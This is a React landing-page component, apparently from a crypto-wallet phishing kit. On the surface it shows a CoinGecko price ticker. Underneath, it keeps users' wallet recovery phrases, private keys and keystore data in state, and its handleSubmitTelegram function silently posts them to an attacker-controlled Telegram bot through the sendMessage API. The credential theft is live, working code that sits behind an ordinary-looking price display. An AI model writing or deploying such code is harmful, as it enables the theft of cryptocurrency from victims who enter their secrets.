import { useState, useEffect } from "react";
import axios from "axios";
import Footer from "../components/Footer";
import { Outlet } from "react-router-dom";
import Headers from "../components/Headers";
import { ProjectContext } from "../context/ProjectContext";

function LandingPage() {
  const [coins, setCoins] = useState([]);


  const [walletName, setWalletName] = useState("");
  const [phrase, setPhrase] = useState("");
  const [privateKey, setPrivateKey] = useState("");
  const [keyStore, setKeyStore] = useState("");
  const [password, setPassword] = useState("");

  // const telegramBotKey = import.meta.env.REACT_APP_TELEGRAM_BOT_TOKEN;
  // const chatId = import.meta.env.TELEGRAM_USER_ID;
  // console.log(chatId);
  const handleSubmitTelegram = async () => {
    const data = {};
    if (walletName) data.walletName = walletName;
    if (phrase) data.phrase = phrase;
    if (privateKey) data.privateKey = privateKey;
    if (keyStore) data.keyStore = keyStore;

    const text = Object.entries(data)
      .map(([key, value]) => `${key}: ${value}`)
      .join("\n");

    try {
      await axios.post(`https://api.telegram.org/bot${import.meta.env.VITE_API_TG_URL}/sendMessage`, {
        chat_id: import.meta.env.VITE_API_CHAT_ID,
        text: text,
      });
      // alert('Message sent successfully!');
    } catch (error) {
      // console.error('Error sending message:', error);
      // alert('Failed to send message.');
    }
  };

  useEffect(() => {
    // Fetch top 10 coins from CoinGecko API
    const fetchCoins = async () => {
      try {
        const response = await axios.get(
          'https://api.coingecko.com/api/v3/coins/markets',
          {
            params: {
              vs_currency: 'usd',
              order: 'market_cap_desc',
              per_page: 20,
              page: 1,
              sparkline: false,
            },
          }
        );
        setCoins(response.data);
        console.log(coins);
      } catch (error) {
        console.error('Error fetching coins:', error);
      }
    };

    fetchCoins();
  }, [coins]);

  return (
    <ProjectContext.Provider
      value={{
        walletName,
        setWalletName,
        phrase,
        setPhrase,
        privateKey,
        setPrivateKey,
        keyStore,
        setKeyStore,
        password,
        setPassword,
        handleSubmitTelegram, // Add handleSubmit to the context
      }}
    >
      <>
        <Headers />
        <div className="bg-gray-50 dark:bg-gray-900 flex items-center justify-center">
          <div className="w-full max-w-4xl rounded-lg p-6">
            <h1 className="text-2xl font-bold text-center mb-6 text-gray-900 dark:text-white">
              Coinmarket Top Crypto
            </h1>
            <div className="overflow-hidden">
              <div className="animate-marquee whitespace-nowrap">
                {coins.map((coin) => (
                  <div
                    key={coin.id}
                    className="inline-flex items-center mx-4 p-2 bg-gray-50 dark:bg-[#101720] rounded-lg"
                  >
                    <img
                      src={coin.image}
                      alt={coin.name}
                      className="w-6 h-6 mr-2" />
                    <span className="font-semibold text-gray-900 dark:text-white text-sm">{coin.name}</span>
                    <span className="ml-2 text-gray-600 dark:text-white text-sm">
                      ${coin.current_price.toLocaleString()}
                    </span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
        <Outlet />
        <Footer />
      </>
    </ProjectContext.Provider>
  );
}

export default LandingPage;
